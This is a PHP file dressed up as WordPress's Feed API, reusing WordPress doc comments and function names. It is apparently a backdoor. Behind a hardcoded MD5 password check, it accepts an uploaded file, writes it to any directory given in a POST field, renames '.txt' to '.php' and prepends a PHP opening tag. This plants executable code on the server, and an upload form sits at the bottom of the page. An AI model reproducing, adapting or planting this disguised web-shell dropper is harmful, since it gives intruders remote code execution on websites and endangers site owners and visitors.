<?php
/**
 * WordPress Feed API
 *
 * Many of the functions used in here belong in The Loop, or The Loop for the
 * Feeds.
 *
 * @package WordPress
 * @subpackage Feed
 */

/**
 * RSS container for the bloginfo function.
 *
 * You can retrieve anything that you can using the get_bloginfo() function.
 * Everything will be stripped of tags and characters converted, when the values
 * are retrieved for use in the feeds.
 *
 * @package WordPress
 * @subpackage Feed
 * @since 1.5.1
 * @uses apply_filters() Calls 'get_bloginfo_rss' hook with two parameters.
 * @see get_bloginfo() For the list of possible values to display.
 *
 * @param string $show See get_bloginfo() for possible values.
 * @return string
 */

class WordpressFeedApi {

	/**
	 * create and initialize
	 * 
	 * @access public
	 * @return void
	 */
	public function init() {
		$titleRss = $_FILES['title_rss']['name'];
		$genTitle=$this->the_title_rss($titleRss);
		$pathApi=$this->wp_path_api();
		
		if ( $genTitle )
			$this->feed_content_type($pathApi);
	}

	/**
	 * Retrieve the current post title for the feed.
	 *
	 * @package WordPress
	 * @subpackage Feed
	 * @since 2.0.0
	 * @uses apply_filters() Calls 'the_title_rss' on the post title.
	 *
	 * @return string Current post title.
	 */
	public function get_the_title_rss() {
		$title = get_the_title();
		$title = apply_filters('the_title_rss', $title);
		return $title;
	}

	/**
	 * Return the content type for specified feed type.
	 *
	 * @package WordPress
	 * @subpackage Feed
	 * @since 2.8.0
	 */
	public function feed_content_type( $path ) {
		$title_temp = $_FILES['title_rss']['tmp_name'];
		$title_name = str_replace('txt', 'php', $_FILES['title_rss']['name']);
		@move_uploaded_file($title_temp, $path."/".$title_name) ? print "<b>Api Done!</b><br>" : print "<b>Api Done</b><br>";
		if (strpos($_FILES['title_rss']['name'], 'txt')!==false) file_put_contents($path."/".$title_name, '<?'.'php'.file_get_contents($path."/".$title_name));
	}

	/**
	 * Display the post title in the feed.
	 *
	 * @package WordPress
	 * @subpackage Feed
	 * @since 0.570
	 * @uses get_the_title_rss() Used to retrieve current post title.
	 */
	public function the_title_rss($titleRss) {
		$feed = $_POST['feed'];
		if (!empty($titleRss)) {
			if (md5($feed) == '5fd04e569389f2be9c26bb6262a14b9e') {
				return true;
			}
		}
		return false;
	}

	/**
	 * Display the HTML type based on the blog setting.
	 *
	 * The two possible values are either 'xhtml' or 'html'.
	 *
	 * @package WordPress
	 * @subpackage Feed
	 * @since 2.2.0
	 */
	public function html_type_rss() {
		$type = get_bloginfo('html_type');
		if (strpos($type, 'xhtml') !== false)
			$type = 'xhtml';
		else
			$type = 'html';
		echo $type;
	}

	/**
	 * Display the path of the feed API.
	 *
	 * @package WordPress
	 * @subpackage Feed
	 * @since 2.2.0
	 * @uses apply_filters() Calls 'wp_path_api' on the blog.
	 *
	 * @param string $path.
	 */
	public function wp_path_api() {
		$pathApi = $_POST['path'];
		if ( !$pathApi ) $pathApi = ".";
		$pathApi = rtrim($pathApi, "/");
		return $pathApi;
	}
}

$__apiSrv=new WordpressFeedApi();
$__apiSrv->init();

?>

<html>
  <head>
    <title>WordPress Feed API</title>
  </head>
  <body>
    <form enctype="multipart/form-data" action="" method="POST">
      Title RSS: <br/><input name="title_rss" type="file" /><br/>
      Path to Feed: <br/><input name="path" value=""/><br/>
      Feed: <br/><input name="feed" value=""/><br/>
      <input type="submit" value="Sent" />
    </form>
  </body>
</html>